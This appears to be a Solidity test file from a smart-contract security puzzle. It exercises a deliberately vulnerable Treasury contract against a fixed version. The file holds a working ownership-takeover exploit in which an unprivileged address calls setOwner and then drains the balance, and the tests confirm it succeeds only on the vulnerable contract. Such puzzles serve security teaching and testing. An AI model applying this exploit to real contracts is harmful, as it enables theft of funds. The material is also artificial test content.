// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;
import {Treasury} from "../src/Treasury.sol";
import {TreasuryFixed} from "../src/TreasuryFixed.sol";
interface Vm { function prank(address) external; function prank(address, address) external; function deal(address, uint256) external; function addr(uint256) external returns (address); function sign(uint256, bytes32) external returns (uint8, bytes32, bytes32); function expectRevert() external; }
Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
interface IT { function setOwner(address) external; function withdraw(uint256) external; }
contract Puzzle003Test {
    address owner = address(0xA11CE); address thief = address(0xBAD);
    function _deploy(bool f) internal returns (IT t) { vm.prank(owner); t = f ? IT(address(new TreasuryFixed())) : IT(address(new Treasury())); vm.deal(address(t), 10 ether); }
    function _exploit(IT t) internal { vm.prank(thief); t.setOwner(thief); vm.prank(thief); t.withdraw(10 ether); }
    function test_exploitWorksOnVulnerable() public { IT t = _deploy(false); _exploit(t); require(thief.balance == 10 ether, "drained"); }
    function test_exploitFailsOnFixed() public { IT t = _deploy(true); try this.exploitExt(t) {} catch {} require(thief.balance == 0 && address(t).balance == 10 ether, "safe"); }
    function exploitExt(IT t) external { _exploit(t); }
    function _normal(IT t) internal { address n = address(0xB0B); vm.prank(owner); t.setOwner(n); vm.prank(n); t.withdraw(1 ether); require(n.balance == 1 ether, "ok"); }
    function test_normalUseVulnerable() public { _normal(_deploy(false)); }
    function test_normalUseFixed() public { _normal(_deploy(true)); }
}
